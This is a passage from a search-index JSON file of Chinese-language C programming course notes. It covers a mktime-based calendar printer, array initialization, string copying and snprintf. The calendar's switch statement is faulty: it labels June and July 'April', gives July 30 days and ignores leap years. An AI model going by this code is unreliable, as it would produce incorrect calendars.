\u4e2d\u5c06\u5bfb\u627e\u6307\u5b9a\u6708\u4efd\u7684\u7b2c\u4e00\u5929\u662f\u661f\u671f\u51e0\u7684\u7b97\u6cd5\u5355\u72ec\u63d0\u70bc\u6210\u4e00\u4e2a\u6587\u4ef6\u63d0\u4f9b\u7ed9\u4e3b\u7a0b\u5e8f <code>#include</code></p>"},{"location":"cs/c/2.4/#first_day_of_monthc","title":"first_day_of_month.c","text":"<pre><code>#include &lt;time.h&gt;\n#include &lt;string.h&gt;\n\n//  written by ...\n\n//  PROVIDED WITHOUT MUCH EXPLANATION YET!\n\n//  RETURNS  0=Sun, 1=Mon, .....\n//\nint first_day_of_month(int month, int year)\n{\n    struct tm tm;\n\n//  SET ALL FIELDS OF tm TO ZERO TO MAKE SOME FIELDS 'UNKNOWN'\n    memset(&amp;tm, 0, sizeof(tm));\n\n//  INITIALIZE THE FILEDS THAT WE ALREADY KNOW\n    tm.tm_mday  = 1;\n    tm.tm_mon   = month-1;              // 0=Jan, 1=Feb, ....\n    tm.tm_year  = year-1900;\n\n//  ASK THE POSIX FUNCTION mktime TO DETERMINE THE 'UNKNOWN' FIELDS\n//  See: http://pubs.opengroup.org/onlinepubs/9699919799/\n    mktime(&amp;tm);\n\n//  RETURN THE INTEGER MONTH VALUE\n    return tm.tm_wday;                  // 0=Sun, 1=Mon, .....\n}\n</code></pre>"},{"location":"cs/c/2.4/#analyzation","title":"Analyzation","text":""},{"location":"cs/c/2.4/#mktime","title":"mktime","text":"<p>\u7b97\u6cd5\u7684\u6838\u5fc3\u5de5\u5177\u4e3a\u4e00\u4e2a\u53eb mktime \u7684\u51fd\u6570\uff1a</p> <p>mktime \u51fd\u6570\u4f7f\u7528 struct tm \u4e2d\u63d0\u4f9b\u7684\u5b57\u6bb5\u6765\u8ba1\u7b97\u65f6\u95f4\uff0c\u5e76\u5c06\u90a3\u4e9b\u6ca1\u6709\u660e\u786e\u6307\u5b9a\u7684\u5b57\u6bb5\uff08\u4f8b\u5982 tm_wday \u548c tm_yday\uff09\u8ba1\u7b97\u51fa\u6765\u3002\u5982\u679c struct tm \u4e2d\u7684\u67d0\u4e9b\u5b57\u6bb5\u672a\u521d\u59cb\u5316\u4e14\u5305\u542b\u5783\u573e\u503c\uff0cmktime \u53ef\u80fd\u4f1a\u4ea7\u751f\u9519\u8bef\u7684\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u4f7f\u7528 memset \u53ef\u4ee5\u907f\u514d\u8fd9\u4e9b\u6f5c\u5728\u7684\u95ee\u9898\u3002</p>"},{"location":"cs/c/2.4/#struct","title":"struct","text":"<p>struct \u7ed3\u6784\u4f53\u5176\u5728 Python \u4e2d\u53ef\u4ee5\u88ab\u7406\u89e3\u4e3a\u4e27\u5931\u4e86 function \u529f\u80fd\u7684 class\uff0c\u5b9a\u4e49\u6570\u636e\u7ed3\u6784:</p> <pre><code>class Point:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\n# \u521b\u5efa\u7c7b\u7684\u5b9e\u4f8b\np1 = Point(10, 20)\nprint(p1.x, p1.y)  # \u8f93\u51fa: 10 20\n</code></pre> <p>\u5728 time.h \u4e2d c \u8bed\u8a00\u4f7f\u7528\u4e86\u7ed3\u6784\u4f53\u5b9a\u4e49\u4e86 tm \u8fd9\u79cd\u6570\u636e\u7c7b\u578b\uff1a</p> <pre><code>struct tm {\n    int tm_sec;     /* seconds after the minute [0-60] */\n    int tm_min;     /* minutes after the hour [0-59] */\n    int tm_hour;    /* hours since midnight [0-23] */\n    int tm_mday;    /* day of the month [1-31] */\n    int tm_mon;     /* months since January [0-11] */\n    int tm_year;    /* years since 1900 */\n    int tm_wday;    /* days since Sunday [0-6] */\n    int tm_yday;    /* days since January 1 [0-365] */\n    int tm_isdst;   /* Daylight Savings Time flag */\n    long    tm_gmtoff;  /* offset from UTC in seconds */\n    char    *tm_zone;   /* timezone abbreviation */\n};\n</code></pre> <p>\u56e0\u6b64 <code>struct tm tm</code> \u4e3a\u58f0\u660e\u4e00\u4e2a tm \u6570\u636e\u7ed3\u6784\u7684\u540d\u4e3a tm \u7684\u53d8\u91cf</p> <pre><code>memset(&amp;tm, 0, sizeof(tm));\n</code></pre> <p>memset \u662f\u4e00\u4e2a\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u7528\u4e8e\u5c06\u4e00\u5757\u5185\u5b58\u533a\u57df\u4e2d\u7684\u6240\u6709\u5b57\u8282\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7684\u503c\u3002memset \u5c06 tm \u7ed3\u6784\u4f53\u7684\u6240\u6709\u5b57\u6bb5\u90fd\u8bbe\u7f6e\u4e3a 0. \u4e3a\u4e86\u4fdd\u8bc1 mktime \u51fd\u6570\u7684\u5de5\u4f5c\u6b63\u5e38\u8c03\u7528\u8be5\u51fd\u6570\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5982\u679c\u4e0d\u8c03\u7528\u624b\u52a8\u521d\u59cb\u5316\u76f8\u5bf9\u6765\u8bf4\u8f83\u4e3a\u9ebb\u70e6\uff1a</p> <pre><code>tm.tm_sec = 0;\ntm.tm_min = 0;\ntm.tm_hour = 0;\ntm.tm_mday = 1;\ntm.tm_mon = month - 1;\ntm.tm_year = year - 1900;\ntm.tm_wday = 0;  // \u8fd9\u4e9b\u5b57\u6bb5\u5b9e\u9645\u4e0a\u4f1a\u88ab mktime \u91cd\u65b0\u8ba1\u7b97\ntm.tm_yday = 0;\ntm.tm_isdst = 0;\n</code></pre> <p>\u5728 <code>time.h</code> \u6587\u4ef6\u91cc\u53ef\u4ee5\u770b\u5230\u5929\u4e3a 1 - 31 \u6b63\u5e38\u4f20\u53c2\u5b9a\u4e49\uff0c\u5468\u4e3a 0 - 11 \u8ba1\u7b97\uff0c\u5e74\u4e3a\u4ece 1900 \u5e74\u7b97\u8d77\uff0c\u56e0\u6b64\u5728\u540e\u7eed\u4f20\u53c2\u6570\u7ed9 <code>first_day_of_month(int month, int year)</code> \u540e\uff0c\u4f1a\u88ab\u81ea\u52a8\u5b9a\u4e49\u4e3a\u6307\u5b9a\u5e74\u4efd\u7684\u6307\u5b9a\u6708\u6570\u7684\u7b2c\u4e00\u5929\u3002\u7ecf\u8fc7 mktime \u51fd\u6570\u8ba1\u7b97\u8fc7\u540e\u4f1a\u8fd4\u56de\u6ca1\u6709\u5b9a\u4e49\u7684\u53d8\u91cf\uff0ctm_wday \u4f1a\u8fd4\u56de 0 - 6 \u5206\u522b\u4f9d\u6b21\u4ee3\u8868\u5468\u672b - \u5468\u516d\u3002</p>"},{"location":"cs/c/2.4/#mycalc","title":"mycal.c","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#include \"first_day_of_month.c\"\n\n#define DEFAULT_MONTH           8\n#define DEFAULT_YEAR            2023\n\n#define NWEEKS                  6\n#define DAYS_PER_WEEK           7\n\nvoid print_cal(int month, int year)\n{\n    int day1        = first_day_of_month(month, year);\n    int daysinmonth = 0;\n\n    switch (month) {\n        case 1: printf(\"   January %i\\n\", year);\n                daysinmonth = 31;\n                break;\n\n        case 2: printf(\"   February %i\\n\", year);\n                daysinmonth = 28;\n                break;\n\n        case 3: printf(\"   March %i\\n\", year);\n                daysinmonth = 31;\n                break;\n\n        case 4: printf(\"   April %i\\n\", year);\n                daysinmonth = 30;\n                break;\n\n        case 5: printf(\"   May %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 6: printf(\"   April %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 7: printf(\"   April %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 8: printf(\"   August %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 9: printf(\"   September %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 10: printf(\"   October %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 11: printf(\"   November %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 12: printf(\"   December %i\\n\", year);\n            daysinmonth = 31;\n            break;\n    }\n\n    printf(\"Su Mo Tu We Th Fr Sa\\n\");\n\n    int day = 1 - day1;\n    for(int w=0 ; w&lt;NWEEKS ; ++w) {\n        for(int d=0 ; d&lt;DAYS_PER_WEEK ; ++d) {\n            if(day &lt; 1 || day &gt; daysinmonth) {\n                printf(\".. \");\n            }\n            else {\n                printf(\"%2i \", day);\n            }\n            ++day;\n        }\n        printf(\"\\n\");\n    }\n}\n\nint main(int argcount, char *argvalue[ ])\n{\n    int month   = DEFAULT_MONTH;\n    int year    = DEFAULT_YEAR;\n\n    if(argcount &gt; 1) {\n        month   = atoi(argvalue[1]);\n        if(argcount &gt; 2) {\n            year = atoi(argvalue[2]);\n        }\n    }\n\n    print_cal(month, year);\n\n    return 0;\n}\n</code></pre> <p>\u7a0b\u5e8f\u7684\u6838\u5fc3\u7247\u6bb5\u7b97\u6cd5\u4e3a\u8be5 nested for loop:</p> <pre><code>for(int w = 0; w &lt; NWEEKS; ++w) {\n    for(int d = 0; d &lt; DAYS_PER_WEEK; ++d) {\n        if(day &lt; 1 || day &gt; daysinmonth) {\n            printf(\".. \");\n        }\n        else {\n            printf(\"%2i \", day);   // format using 2 columns\n        }\n        ++day;\n    }\n    printf(\"\\n\");       // move printing to a new line after each week\n}\n</code></pre>"},{"location":"cs/c/2.4/#outer-loop","title":"Outer Loop","text":"<p>w \u53d8\u91cf\uff1a\u8868\u793a\u5f53\u524d\u7684\u5468\u6570\uff0c\u4ece 0 \u5f00\u59cb\u5230 NWEEKS - 1\uff0c\u8fd9\u91cc NWEEKS \u88ab\u5b9a\u4e49\u4e3a 6\uff0c\u610f\u5473\u7740\u6700\u591a\u6253\u5370 6 \u884c\uff0c\u6bcf\u884c\u4ee3\u8868\u4e00\u5468\u3002</p> <p>\u5faa\u73af\u4f5c\u7528\uff1a\u5916\u5c42\u5faa\u73af\u8d1f\u8d23\u63a7\u5236\u884c\u6570\uff08\u5373\u5468\u6570\uff09\uff0c\u6bcf\u4e00\u8f6e\u5faa\u73af\u6253\u5370\u4e00\u5468\u7684\u65e5\u671f\u3002</p>"},{"location":"cs/c/2.4/#inner-loop","title":"Inner Loop","text":"<p>d \u53d8\u91cf\uff1a\u8868\u793a\u5f53\u524d\u7684\u5929\u6570\uff08\u4ece\u5468\u65e5\u5230\u5468\u516d\uff09\uff0c\u4ece 0 \u5f00\u59cb\u5230 DAYS_PER_WEEK - 1\uff0c\u8fd9\u91cc DAYS_PER_WEEK \u88ab\u5b9a\u4e49\u4e3a 7\uff0c\u8868\u793a\u4e00\u5468\u4e03\u5929\u3002</p> <p>\u5faa\u73af\u4f5c\u7528\uff1a\u5185\u5c42\u5faa\u73af\u8d1f\u8d23\u63a7\u5236\u4e00\u5468\u4e2d\u6bcf\u5929\u7684\u8f93\u51fa\uff0c\u786e\u4fdd\u5728\u6bcf\u4e00\u884c\u4e2d\u6253\u5370\u51fa\u4ece\u5468\u65e5\u5230\u5468\u516d\u7684\u65e5\u671f\u3002</p>"},{"location":"cs/c/2.4/#_1","title":"\u5224\u65ad\u903b\u8f91","text":"<pre><code>if(day &lt; 1 || day &gt; daysinmonth) {\n    printf(\".. \");\n} else {\n    printf(\"%2i \", day);   // format using 2 columns\n}\n</code></pre> <ul> <li>day \u53d8\u91cf\uff1aday \u662f\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5f53\u524d\u9700\u8981\u6253\u5370\u7684\u65e5\u671f\u3002\u8fd9\u4e2a\u53d8\u91cf\u6700\u521d\u88ab\u521d\u59cb\u5316\u4e3a 1 - day1\uff0c\u5176\u4e2d day1 \u662f\u8fd9\u4e2a\u6708\u7b2c\u4e00\u5929\u7684\u661f\u671f\u6570\uff08\u4f8b\u5982\uff0c0 \u8868\u793a\u661f\u671f\u65e5\uff0c1 \u8868\u793a\u661f\u671f\u4e00\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff09\u3002</li> </ul> <ul> <li>if(day &lt; 1 || day &gt; daysinmonth) \u6761\u4ef6\uff1a</li> </ul> <ul> <li>\u5982\u679c day \u5c0f\u4e8e 1\uff08\u8868\u793a\u5f53\u524d\u7684\u65e5\u671f\u5728\u8fd9\u4e2a\u6708\u5f00\u59cb\u4e4b\u524d\uff09\u6216\u8005\u5927\u4e8e daysinmonth\uff08\u8868\u793a\u5f53\u524d\u7684\u65e5\u671f\u5df2\u7ecf\u8d85\u51fa\u4e86\u8fd9\u4e2a\u6708\u7684\u5929\u6570\uff09\uff0c\u5c31\u6253\u5370 \"..\" \u4f5c\u4e3a\u5360\u4f4d\u7b26\u3002</li> </ul> <ul> <li>\u8fd9\u6837\u53ef\u4ee5\u4fdd\u6301\u6bcf\u4e00\u884c\u7684\u683c\u5f0f\u4e00\u81f4\uff0c\u5c24\u5176\u662f\u5728\u7b2c\u4e00\u4e2a\u661f\u671f\u5f00\u59cb\u4e4b\u524d\u7684\u7a7a\u767d\u5904\u548c\u6700\u540e\u4e00\u4e2a\u661f\u671f\u7ed3\u675f\u540e\u7684\u7a7a\u767d\u5904\u3002</li> </ul> <ul> <li>else \u5206\u652f\uff1a</li> </ul> <ul> <li>\u5982\u679c day \u5728\u5408\u6cd5\u8303\u56f4\u5185\uff08\u5373\u5927\u4e8e\u6216\u7b49\u4e8e 1 \u4e14\u5c0f\u4e8e\u6216\u7b49\u4e8e daysinmonth\uff09\uff0c\u5219\u6253\u5370\u5f53\u524d\u65e5\u671f\u3002%2i \u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u8868\u793a\u6253\u5370\u4e00\u4e2a\u53f3\u5bf9\u9f50\u7684\u4e24\u4f4d\u6570\u65e5\u671f\u3002</li> </ul> <ul> <li>++day\uff1a\u6bcf\u6253\u5370\u4e00\u5929\uff0cday \u53d8\u91cf\u81ea\u589e 1\uff0c\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u65e5\u671f\u3002</li> </ul> <ul> <li>\u5728\u5185\u5c42\u5faa\u73af\u7ed3\u675f\u540e\uff0c\u8c03\u7528 printf(\"\\n\"); \u5c06\u6253\u5370\u79fb\u52a8\u5230\u4e0b\u4e00\u884c\uff0c\u4ece\u800c\u5f00\u59cb\u6253\u5370\u4e0b\u4e00\u5468\u7684\u65e5\u671f\u3002</li> </ul>"},{"location":"cs/c/2.4/#conclusion","title":"Conclusion","text":"<p>\u8be5\u7a0b\u5e8f\u6838\u5fc3\u4e3a\u8c03\u7528 mktime \u51fd\u6570\u4f20\u53c2\u6307\u5b9a\u5e74\u4efd\u548c\u6708\u6570\u4ee5\u53ca\u5f53\u6708\u7684\u7b2c\u4e00\u5929\uff0c\u83b7\u5f97\u5176\u8fd4\u56de\u7684\u5f53\u6708\u7684\u7b2c\u4e00\u5929\u5c5e\u4e8e\u7b2c\u51e0\u5468\u3002\u7136\u540e\u4f7f\u7528 nested for loop \u6253\u5370\u4e8c\u7ef4\u77e9\u9635\uff1a\u5916\u5c42\u8d1f\u8d23\u63a7\u5236\u6700\u5927\u5468\u6570\uff0c\u4e00\u4e2a\u6708\u6700\u5927\u7684\u5468\u6570\u4e0d\u4f1a\u8d85\u8fc7 6 \u884c\uff0c\u56e0\u6b64\u5728\u6253\u5370 2 \u6708\u7684\u65f6\u5019\u53ef\u4ee5\u53d1\u73b0\u6700\u540e\u4e00\u5468\u5168\u90e8\u88ab\u66ff\u6362\u6210\u4e86 ..</p> <pre><code>   February 2023\nSu Mo Tu We Th Fr Sa\n.. .. ..  1  2  3  4 \n 5  6  7  8  9 10 11 \n12 13 14 15 16 17 18 \n19 20 21 22 23 24 25 \n26 27 28 .. .. .. .. \n.. .. .. .. .. .. .. \n</code></pre> <p>\u5185\u5c42\u5faa\u73af\u4e3b\u8981\u5224\u65ad\u5f53\u6708\u7b2c\u4e00\u5929\u7684\u8d77\u59cb\u4f4d\u7f6e\uff0c\u7528 1 - day1 \u7684\u7b97\u6cd5\u786e\u5b9a\u6709\u591a\u5c11\u4e2a\u7a7a\u5929\u6570\uff0c\u4f8b\u5982\u5468\u4e94\u5c31\u662f -4, [-4, -3, -2, -1, 0] \u4e00\u76f4\u5230\u7b49\u4e8e 1 \u7684\u65f6\u5019\u5c31\u80fd\u786e\u8ba4\u8be5\u5217\u662f\u7b2c\u4e00\u5929\uff0c\u7136\u540e\u7528 <code>%2i</code> \u7684\u683c\u5f0f\u4fdd\u8bc1\u4e24\u4e2a\u5b57\u6bb5\u5bbd\u5ea6\u8f93\u51fa\u5929\u6570\uff0c\u4e3b\u8981\u4e3a\u4e86\u4fdd\u8bc1\u683c\u5f0f\u5316\u8f93\u51fa\u540e\u7684\u7f8e\u89c2\u6574\u9f50\uff0c\u7136\u540e\u9010\u6e10\u589e\u52a0 day \u7684\u5929\u6570\u76f4\u5230\u8d85\u8fc7\u5f53\u6708\u63d0\u524d\u5b9a\u4e49\u597d\u7684\u6700\u5927\u5929\u6570\u3002</p> <pre><code>   December 2023\nSu Mo Tu We Th Fr Sa\n.. .. .. .. ..  1  2 \n 3  4  5  6  7  8  9 \n10 11 12 13 14 15 16 \n17 18 19 20 21 22 23 \n24 25 26 27 28 29 30 \n31 .. .. .. .. .. .. \n</code></pre> <p>\u7a0b\u5e8f\u7528\u5230\u4e86 atoi \u7ed9 argvalue \u8f6c\u6362\u6570\u636e\u7c7b\u578b\u4e3a integer, \u7528 switch \u8bed\u53e5\u63d0\u524d\u6253\u5370\u7b2c\u4e8c\u884c\u7684\u6708\u4efd\u5e76\u624b\u52a8\u5b9a\u4e49\u6700\u5927\u5929\u6570\uff0c\u56e0\u6b64\u5728 switch \u4e2d\u6ca1\u6709\u7528\u5230 default \u8bed\u53e5\u3002\u6559\u6388\u8fd8\u7528\u5230\u4e86 <code>#define</code> \u8bed\u53e5\u63d0\u524d\u5b9a\u4e49\u4e00\u4e9b\u5e38\u91cf\uff0c\u8282\u7701\u5185\u5b58\u4e0e\u7f16\u8bd1\u5668\u65f6\u95f4\u3002</p>"},{"location":"cs/c/3.1/","title":"3.1 Data Structure","text":""},{"location":"cs/c/3.1/#mon-wed-lecture","title":"Mon &amp; Wed Lecture","text":"<p>\u4e3b\u8981\u8bb2\u8ff0\u4e86\u6570\u636e\u7ed3\u6784\u4e0e <code>struct</code> \u6570\u7ec4\u5b9a\u4e49</p>"},{"location":"cs/c/3.1/#arrays","title":"arrays","text":"<p>\u65e0\u8bba\u4f60\u7528\u4ec0\u4e48\u7f16\u7a0b\u8bed\u8a00\uff0c\u53cc\u5217\u8868\u7b2c\u4e00\u4e2a\u505a\u7684\u4e8b\u6c38\u8fdc\u662f\u628a\u7b2c\u4e00\u4e2a\u7ef4\u5ea6\u89c6\u4e3a\u884c\uff0c\u7b2c\u4e8c\u4e2a\u7ef4\u5ea6\u89c6\u4e3a\u5217</p>"},{"location":"cs/c/3.1/#initialization","title":"Initialization","text":"<p>\u6211\u4eec\u4e00\u822c\u503e\u5411\u4e8e\u5728 C \u6587\u4ef6\u5f00\u5934\u4f7f\u7528 <code>define</code> \u8bed\u53e5\u63d0\u524d\u5b9a\u4e49\u597d\u5217\u8868\u7684\u5185\u5b58\u5927\u5c0f</p> <pre><code>#define  N   20\n\nint   myarray[ N ];\nint   evensum;\n\nevensum = 0;\nfor(int i=0 ; i &lt; N ; ++i) {\n    myarray[ i ] = i * 2;                                  \n    evensum      = evensum + myarray[ i ];\n}\n</code></pre> <p>\u4e00\u7ef4\u5217\u8868\u7684\u521d\u59cb\u5316\u65b9\u6cd5\u5982\u4e0b\uff0c\u548c Python \u4e0d\u540c\u7684\u662f C \u7684\u4e00\u5207\u90fd\u9700\u8981\u63d0\u524d\u5728\u5185\u5b58\u4e2d\u521d\u59cb\u5316\u597d\u540e\u518d\u63a5\u5165\u5176\u5143\u7d20\uff0c\u6709\u8fd0\u884c\u65f6\u521d\u59cb\u5316\u5e76\u5206\u914d\u5143\u7d20\u4e0e\u7f16\u8bd1\u65f6\u521d\u59cb\u5316\u4e24\u79cd\u65b9\u6848</p> <p>initialize the elements at run-time, by executing statements to assign values to the elements</p> <pre><code>#define  N   5\n\nint   myarray[ N ];\n\n....\n\n    for(int i=0 ; i &lt; N ; ++i) {\n        myarray[ i ] = i;\n    }\n</code></pre> <p>initialize the values at compile-time, by telling the compiler what values to initially store in the memory</p> <pre><code>#define  N   5\n\nint   myarray[ N ] = { 0, 1, 2, 3, 4 };\n</code></pre> <p>\u7f16\u8bd1\u65f6\u8ba9\u81ea\u52a8\u521d\u59cb\u5316\u5206\u914d\u5185\u5b58\u5927\u5c0f</p> <pre><code>int   myarray[ ] = { 0, 1, 2, 3, 4 };\n\n#define  N   (sizeof(myarray) / sizeof(myarray[0]))\n</code></pre> <p>\u5728\u4e0d\u6307\u5b9a\u5185\u5b58\u5927\u5c0f\u7684\u65f6\u5019\uff0c\u7f16\u8bd1\u65f6\u4f1a\u6839\u636e\u5143\u7d20\u6570\u91cf\u81ea\u52a8\u63a8\u5012\uff0cdefine \u8fd9\u884c\u5217\u8868\u4e2d\u90fd\u662f\u540c\u4e00\u7c7b\u578b\u7684\u6570\u636e\uff0c\u6bcf\u4e2a int \u5143\u7d20\u5360\u636e 4 bytes, sizeof(array) \u4f1a\u8fd4\u56de\u5217\u8868\u5927\u5c0f\u4e5f\u5c31\u662f 4 * 5 = 20, \u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\u4e3a 4 \u76f8\u9664\u5c31\u6210\u4e86\u5217\u8868\u957f\u5ea6\u3002</p> <p>\u63d0\u524d\u9884\u7559\u5185\u5b58\u4e0e\u6307\u5b9a\u90e8\u5206\u5143\u7d20</p> <pre><code>#define  HUGE   10000\n\nint   myarray[ HUGE ] = { 4, 5 };\n</code></pre> <p>\u5728 run-time \u540e define \u624d\u80fd\u786e\u5b9a\u5927\u5c0f\u7684\u6570\u7ec4\u88ab\u79f0\u4e4b\u4e3a  variable-length arrays, or variable-sized arrays \u4e5f\u5c31\u662f\u53ef\u53d8\u957f\u5ea6\u6570\u7ec4\u548c\u53ef\u53d8\u5927\u5c0f\u6570\u7ec4\uff1b\u4f46\u7531\u4e8e\u5176\u5728\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e2d\u5b9e\u73b0\u6548\u7387\u4f4e\u4e0b\uff0c\u73b0\u4ee3 Linux \u5185\u6838\u79fb\u9664\u4e86\u53ef\u53d8\u957f\u5ea6\u6570\u7ec4\uff0cC11 \u4e2d\u6210\u4e3a\u4e86\u53ef\u9009\u5b9a\u4e49\u3002\u5e76\u4e14\u53ef\u53d8\u957f\u5ea6\u6570\u7ec4\u90fd\u53ef\u4ee5\u5728\u4e00\u4e2a\u51fd\u6570\u4e2d\u5b9a\u4e49\u5e76\u4f20\u9012\u7ed9\u53e6\u4e00\u4e2a\u51fd\u6570\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u5927\u5c0f\u5728\u8fd0\u884c\u65f6\u4e4b\u524d\u662f\u672a\u77e5\u7684\uff0c\u56e0\u6b64\u4e5f\u5fc5\u987b\u4f20\u9012\u6570\u7ec4\u7684\u5927\u5c0f\u3002\u65e0\u6cd5\u6839\u636e\u6570\u7ec4\u7684\u540d\u79f0\u786e\u5b9a\u6570\u7ec4\u7684\u5927\u5c0f\u3002</p> <pre><code>void function2(int array_size, char vla[ ])\n{\n    for(int i=0 ; i &lt; array_size ; ++i) {\n        // access vla[i] ...\n        ....\n    }\n}\n\nvoid function1(void)\n{\n    int size = read an integer from keyboard or a file;\n\n    char vla[ size ];\n\n    function2(size, vla);\n}\n</code></pre>"},{"location":"cs/c/3.1/#strings","title":"strings","text":"<p>\u7531\u4e8e C \u4e2d\u4e0d\u5177\u5907\u5b57\u7b26\u4e32\u8fd9\u79cd\u57fa\u7840\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4f7f\u7528\u7684\u662f char array \u6570\u7ec4\u5b57\u7b26\u53bb\u5b9e\u73b0\uff0c\u65e0\u8bba\u662f <code>#include &lt;string.h&gt;</code> \u4e0b\u53ef\u88ab\u8c03\u7528\u7684\u529f\u80fd\u8ba1\u7b97\u5b57\u7b26\u957f\u5ea6\uff0c\u662f\u5426\u76f8\u7b49\uff0c\u62f7\u8d1d\u7b49\u548c <code>printf</code> \u4e00\u6837\u90fd\u672c\u8d28\u662f\u7ba1\u7406\u5b57\u7b26\u6570\u7ec4\u3002</p> <pre><code>char greeting[5] = { 'h', 'e', 'l', 'l', 'o' };\n\nchar today[6]    = \"Monday\";\n\nchar month[]     = \"August\";\n</code></pre> <p>\u548c int \u4e00\u6837\u540c\u6837\u652f\u6301\u81ea\u52a8\u8ba1\u7b97\u5206\u914d\u6240\u9700\u5927\u5c0f</p>"},{"location":"cs/c/3.1/#strings-are-terminated-by-a-special-character","title":"Strings are terminated by a special character","text":"<p>\u5728\u6570\u7ec4\u4e2d <code>\\0</code> \u88ab\u79f0\u4e3a null byte, \u4e00\u822c\u7528\u4e8e char arrary \u4e2d\u7684\u672b\u5c3e\u5e8f\u5217\uff0c\u6807\u660e string \u5230\u8fd9\u91cc\u5c31\u5904\u7406\u7ed3\u675f\u4e86\uff1a</p> <pre><code>h e l l o \\0\n</code></pre> <p>\u8fd9\u4e2a\u5b57\u7b26\u9700\u8981\u516d\u4e2a\u5b57\u8282\u7684\u5185\u5b58\u624d\u80fd\u88ab\u6b63\u5e38\u50a8\u5b58\uff0c\u4f46\u662f strlen \u8fd9\u6837\u7684\u51fd\u6570\u8fd4\u56de\u4f1a\u663e\u793a 5</p> <p>\u5148\u524d\u7684\u6848\u4f8b <code>char month[] = \"August\";</code> \u4e2d\uff0c\u5b9e\u9645\u4e0a\u7cfb\u7edf\u81ea\u52a8\u7ed9 August \u672b\u5c3e\u5206\u914d\u4e86\u4e00\u4e2a <code>\\0</code> \u7b26\uff0c\u4f7f\u7528\u4e86 7 \u4e2a\u4f4d\u7f6e\u50a8\u5b58,\uff0c\u4f46\u5728 Monday \u4e2d\u7531\u4e8e\u6307\u5b9a\u4e86\u5185\u5b58\u5927\u5c0f\u56e0\u6b64\u4e0d\u4f1a\u88ab\u81ea\u52a8\u5206\u914d <code>\\0</code> \u7b26</p> <pre><code>h e l l o wo r l d \\0\n</code></pre> <p>\u5982\u679c\u6267\u884c <code>arrary[5] = '\\0'</code>, \u6570\u7ec4\u4ecd\u7136\u4f1a\u5360\u636e 12 \u4e2a\u5b57\u8282\u7684\u50a8\u5b58\u7a7a\u95f4\uff0c\u4f46\u662f\u5982\u679c\u6253\u5370\u51fa\u6765\u5c31\u53ea\u4f1a\u5f97\u5230 hello</p>"},{"location":"cs/c/3.1/#copy-one-string-into-another","title":"copy one string into another","text":"<p>solution one\uff1a for loop</p> <pre><code>void my_strcpy(char destination[], char source[])\n{\n    int length = strlen(source);\n\n    for(int i = 0 ; i &lt; length ; ++i) {\n        destination[i] = source[i];\n    }\n    destination[length] = '\\0';\n}\n</code></pre> <p>\u89e3\u51b3\u65b9\u6848\u4e00\u662f\u9996\u5148\u8ba1\u7b97\u957f\u5ea6\u7136\u540e\u63d2\u8fdb\u65b0\u6570\u7ec4\u5185\u5bb9\uff0c\u6700\u540e\u63d2\u5165 <code>\\0</code> \u7ed3\u675f</p> <p>solution two: while loop unbounded loop:</p> <pre><code>void my_strcpy(char destination[], char source[])\n{\n    int  i = 0;\n\n    while(source[i] != '\\0') {\n        destination[i] = source[i];\n        i = i+1;\n    }\n    destination[i] = '\\0';\n}\n</code></pre> <p>\u6839\u636e\u539f source \u6570\u7ec4\u5224\u65ad\uff0c\u53ea\u8981\u4e0d\u662f null byte \u5c31\u7ee7\u7eed\u590d\u5236\uff0cdo while \u540c\u6837\u53ef\u4ee5\u5b9e\u73b0</p> <pre><code>// USE AN UNBOUNDED LOOP, COPYING UNTIL THE NULL-BYTE \n\nvoid my_strcpy(char destination[], char source[])\n{\n    int  i = 0;\n\n    do {\n        destination[i] = source[i];\n        i = i+1;\n    } while(source[i-1] != '\\0');\n}\n</code></pre>"},{"location":"cs/c/3.1/#sprintf-","title":"sprintf - \u683c\u5f0f\u5316\u5199\u5165\u53d8\u91cf","text":"<p>\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u6211\u4eec\u7684\u201c\u8f93\u51fa\u201d\u88ab\u5199\u5165\u5b57\u7b26\u6570\u7ec4\uff0c\u800c\u4e0d\u662f\u5230\u5c4f\u5e55\u4e0a\u3002</p> <pre><code>#include &lt;stdio.h&gt;\n\nchar chess_outcome[64];\n\nif(winner == WHITE) {\n    sprintf(chess_outcome, \"WHITE with %i\", nwhite_pieces);\n}\nelse {\n    sprintf(chess_outcome, \"BLACK with %i\", nblack_pieces);\n}\nprintf(\"The winner: %s\\n\", chess_outcome);\n</code></pre> <p>\u9ed8\u8ba4\u53ef\u4ee5\u8fd9\u6837\u7528\uff0c\u4f46\u7531\u4e8e\u4e0d\u8981\u8d85\u8fc7\u63a5\u6536\u683c\u5f0f\u5316\u6253\u5370\u7684\u6570\u7ec4\u7684\u6700\u5927\u957f\u5ea6\uff0c\u56e0\u6b64\u53ef\u4ee5\u5b9a\u4e49</p> <pre><code>char chess_outcome[64];\n\n//  FORMAT, AT MOST, A KNOWN NUMBER OF CHARACTERS\nif(winner == WHITE) {\n    snprintf(chess_outcome, 64, \"WHITE with %i\", nwhite_pieces);\n}\n\n//  OR, GREATLY PREFERRED:\nif(winner == WHITE) {\n    snprintf(chess_outcome, sizeof(chess_outcome), \"WHITE with %i\", nwhite_pieces);\n}\n</code></pre>"},{"location":"cs/c/3.1/#struct","title":"struct","text":""},{"location":"cs/c/3.1/#anonymous-struct","title":"anonymous struct","text":"<p>\u6559\u6388\u7528\u4e86 RGB 